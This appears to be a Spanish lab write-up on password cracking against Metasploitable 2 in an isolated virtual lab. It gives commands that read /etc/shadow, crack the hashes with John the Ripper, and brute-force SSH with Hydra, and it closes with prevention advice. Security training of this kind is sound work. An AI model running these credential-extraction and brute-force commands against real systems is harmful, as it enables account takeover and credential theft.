# Cracking de contraseñas en Metasploitable 2

**Entorno:** laboratorio propio (Kali Linux → Metasploitable 2) en una Red NAT de VirtualBox aislada
**Categoría:** Cracking de contraseñas / ataques de autenticación
**Fecha:** 20/11/2026

## Objetivo
A partir del acceso root obtenido en la Lección 05, extraer y crackear los hashes de
`/etc/shadow`, y comprobar la robustez del servicio SSH frente a un ataque de credenciales.

## Obtención de los hashes
Desde la sesión de Meterpreter (`shell`), se extrajeron:
```bash
cat /etc/passwd
cat /etc/shadow
```
Combinados con:
```bash
unshadow passwd.txt shadow.txt > hashes.txt
```

## Cracking con John the Ripper

**Primera pasada, diccionario completo:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
Resultado (3 min 37 s, ~65.000 contraseñas/segundo):
```
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ ...)
123456789        (klog)
batman           (sys)
service          (service)
3g 0:00:03:37 DONE
```

**Segunda pasada, diccionario dirigido** (sabiendo que `msfadmin` es la cuenta por
defecto de Metasploitable):
```bash
echo "msfadmin" > mini.txt
echo "root" >> mini.txt
echo "toor" >> mini.txt
john --wordlist=mini.txt hashes.txt
```
Resultado:
```
Remaining 4 password hashes with 4 different salts
msfadmin         (msfadmin)
1g 0:00:00:00 DONE
```

### Contraseñas encontradas
| Usuario | Contraseña | Observación |
|---|---|---|
| `klog` | `123456789` | Secuencia numérica trivial |
| `sys` | `batman` | Palabra de diccionario común |
| `service` | `service` | **Contraseña igual al nombre de usuario** |
| `msfadmin` | `msfadmin` | Credencial por defecto conocida, sin cambiar |

Quedaron sin crackear con estos diccionarios: `root`, `postgres`, `user`.

## Ataque en vivo con Hydra

**Comprobación inicial del puerto:**
```bash
nmap -p 22 10.0.2.3
# 22/tcp open ssh
```

**Primer intento:**
```bash
hydra -l msfadmin -p msfadmin ssh://10.0.2.3
```
Falló con:
```
[ERROR] could not connect to ssh://10.0.2.3:22 - kex error: no match for method mac algo
client→server: server [hmac-md5,hmac-sha1,umac-64@openssh.com,...]
client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,...]
```
**Causa:** Kali moderna deshabilita por defecto los algoritmos MAC antiguos que
OpenSSH 4.7 (2007) es lo único que sabe usar. No hay ningún algoritmo en común.

**Solución:** se añadieron algoritmos legados en `/etc/ssh/ssh_config` (con `+`, que
añade sin quitar los modernos, para no debilitar la seguridad de otras conexiones):
```
Host *
    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
    HostkeyAlgorithms +ssh-rsa
    Ciphers +aes128-cbc,3des-cbc
    MACs +hmac-md5,hmac-sha1,hmac-sha1-96,hmac-md5-96
```
Tras el ajuste, la conexión SSH funcionó correctamente.

## Análisis
- **Contraseñas débiles generalizadas:** 4 de 7 cuentas activas caen con un
  diccionario público en minutos o segundos.
- **Credenciales por defecto sin cambiar:** `msfadmin:msfadmin`.
- **Contraseña igual al usuario:** `service:service`, el fallo de configuración más
  básico y más común en sistemas reales.
- **Criptografía SSH obsoleta:** el servidor solo admite algoritmos de 2007,
  vulnerables en sí mismos (MD5, SHA1 rotos para otros usos), independientemente de
  las contraseñas.

## Cómo se previene
- Política de contraseñas fuertes y únicas, nunca iguales al usuario.
- Cambiar toda credencial por defecto tras la instalación.
- Bloqueo de cuenta tras varios intentos fallidos, para frenar ataques tipo Hydra.
- Autenticación de dos factores, para que una contraseña robada no baste.
- Actualizar OpenSSH y deshabilitar algoritmos criptográficos obsoletos en el
  **servidor** (aquí solo se ajustó mi cliente para poder auditarlo).

## Qué aprendí
Que crackear hashes y atacar en vivo son dos técnicas distintas con usos distintos:
la primera es rápida y silenciosa una vez tienes el hash, la segunda es lenta y
ruidosa pero no requiere haber comprometido antes el sistema. También aprendí a
diagnosticar y resolver un problema real de incompatibilidad criptográfica entre una
herramienta moderna y un sistema antiguo, y a documentarlo como lo que es: un hallazgo
de seguridad por sí mismo.

## Siguiente paso
Salir del entorno de Metasploitable (2010) y pasar a objetivos con tecnología actual:
aplicaciones web modernas (OWASP Juice Shop), Active Directory y seguridad en LLM
(Lección 07 en adelante).
